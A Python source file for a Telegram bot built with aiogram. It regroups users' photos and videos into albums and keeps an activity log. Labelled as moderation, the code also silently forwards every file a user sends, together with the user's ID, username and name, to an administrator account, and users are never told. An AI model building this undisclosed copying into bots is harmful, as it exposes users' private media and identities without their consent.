import os
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
from aiogram.utils.media_group import MediaGroupBuilder
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

# === НАСТРОЙКИ (НЕ ИЗМЕНЯЙТЕ В ЭТОМ ФАЙЛЕ) ===
# Токен будет браться из переменной окружения
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # Должен быть числом
LOG_FILE = "bot_activity.log"

# === МИДЛВЕР ДЛЯ СБОРКИ И МОДЕРАЦИИ ===
class MediaModerationMiddleware:
    def __init__(self, bot=None):
        # Буфер для всех пользователей: {user_id: [сообщения]}
        self.buffers = {}
        self.bot = bot  # Сохраняем ссылку на бота

    async def _forward_to_admin(self, user_id: int, media_list: list):
        """Пересылает все медиа администратору для модерации"""
        if not media_list or not ADMIN_ID:
            return
            
        # Создаем сообщение с информацией о пользователе
        user_info = media_list[0].from_user
        info_msg = (
            f"📩 Новые файлы от пользователя:\n"
            f"• ID: {user_info.id}\n"
            f"• Username: @{user_info.username or 'не указан'}\n"
            f"• Имя: {user_info.first_name} {user_info.last_name or ''}\n"
            f"• Всего файлов: {len(media_list)}"
        )
        
        try:
            # Отправляем информацию администратору
            await self.bot.send_message(ADMIN_ID, info_msg)
            
            # Пересылаем каждый файл по одному
            for msg in media_list:
                if msg.photo or msg.video:
                    await self.bot.forward_message(
                        chat_id=ADMIN_ID,
                        from_chat_id=msg.chat.id,
                        message_id=msg.message_id
                    )
                    await asyncio.sleep(0.1)  # Небольшая пауза
            
            # Отправляем подтверждение
            await self.bot.send_message(
                ADMIN_ID,
                "✅ Все файлы пересланы. Обработка завершена."
            )
        except Exception as e:
            print(f"Ошибка пересылки администратору: {e}")

    async def _process_buffer(self, user_id: int):
        """Обрабатывает буфер пользователя и отправляет альбомы"""
        if user_id not in self.buffers:
            return
            
        all_media = self.buffers[user_id]
        del self.buffers[user_id]
        
        # Пересылка администратору (вы увидите всё)
        await self._forward_to_admin(user_id, all_media)
        
        # Разбиваем на альбомы по 10 файлов
        for i in range(0, len(all_media), 10):
            album = all_media[i:i+10]
            media_group = MediaGroupBuilder()
            
            for msg in album:
                if msg.photo:
                    media_group.add_photo(media=msg.photo[-1].file_id)
                elif msg.video:
                    media_group.add_video(media=msg.video.file_id)
            
            try:
                # Отправляем альбом
                await album[0].answer_media_group(
                    media=media_group.build(),
                    request_timeout=120
                )
                
                # Логируем
                photo_count = sum(1 for m in album if m.photo)
                video_count = sum(1 for m in album if m.video)
                self._log_activity(
                    album[0].from_user.id,
                    album[0].from_user.username or "unknown",
                    len(album),
                    photo_count,
                    video_count
                )
            except Exception as e:
                print(f"Ошибка отправки альбома: {e}")

    def _log_activity(self, user_id, username, total, photos, videos):
        """Записывает подробную активность в лог-файл"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] User {user_id} (@{username}): "
                    f"processed {total} files "
                    f"({photos} photos, {videos} videos)\n")

    async def __call__(self, handler, message: Message, data):
        """Обрабатывает ВСЕ медиа как отдельные файлы"""
        # 1. Проверяем, является ли сообщение админ-командой
        if message.from_user.id == ADMIN_ID:
            if message.text == "/admin":
                await self._show_admin_panel(message)
                return await handler(message, data)
            elif message.text == "/logs":
                await self._show_logs(message)
                return await handler(message, data)
        
        # 2. Проверяем, есть ли в сообщении фото или видео
        has_media = message.photo or message.video
        
        # 3. Если есть медиа — добавляем в общий буфер
        if has_media:
            user_id = message.from_user.id
            
            # Инициализируем буфер для пользователя
            if user_id not in self.buffers:
                self.buffers[user_id] = []
                # Запускаем обработку через 1.5 сек
                asyncio.create_task(self._delayed_processing(user_id))
            
            # Добавляем сообщение в буфер (проверка на дубли)
            if not any(m.message_id == message.message_id for m in self.buffers[user_id]):
                self.buffers[user_id].append(message)
        
        return await handler(message, data)
    
    async def _delayed_processing(self, user_id: int):
        """Задержанная обработка буфера"""
        await asyncio.sleep(1.5)
        await self._process_buffer(user_id)
    
    async def _show_admin_panel(self, message: Message):
        """Показывает админ-панель"""
        active_users = len(self.buffers)
        total_files = sum(len(buf) for buf in self.buffers.values())
        
        status = "📊 Статус бота:\n"
        status += f"• Активных пользователей: {active_users}\n"
        status += f"• Файлов в обработке: {total_files}\n\n"
        status += "Доступные команды:\n"
        status += "/logs - Посмотреть последние логи"
        
        await message.answer(status)
    
    async def _show_logs(self, message: Message):
        """Показывает последние логи"""
        if not os.path.exists(LOG_FILE):
            await message.answer("Логи пока пусты")
            return
            
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                logs = f.readlines()[-20:]
            
            if not logs:
                await message.answer("Логи пусты")
                return
                
            log_text = "📋 Последние операции:\n\n" + "".join(logs)
            await message.answer(log_text[:4000])
        except Exception as e:
            await message.answer(f"Ошибка чтения логов: {str(e)}")

async def main():
    # Создаем объекты бота и диспетчера
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher()
    
    # Регистрируем middleware
    dp.message.middleware(MediaModerationMiddleware(bot=bot))
    
    # Хендлер для всех сообщений
    @dp.message()
    async def handle_all(message: Message):
        pass
    
    # Получаем порт из переменной окружения
    port = int(os.getenv("PORT", "8080"))
    
    # Настраиваем вебхук
    webhook_path = "/webhook"
    app = web.Application()
    
    SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
    ).register(app, path=webhook_path)
    
    setup_application(app, dp, bot=bot)
    
    # Запускаем веб-сервер
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=port)
    await site.start()
    
    print(f"Бот запущен на порту {port}. Для остановки нажмите CTRL+C")
    
    # Ожидаем завершения
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())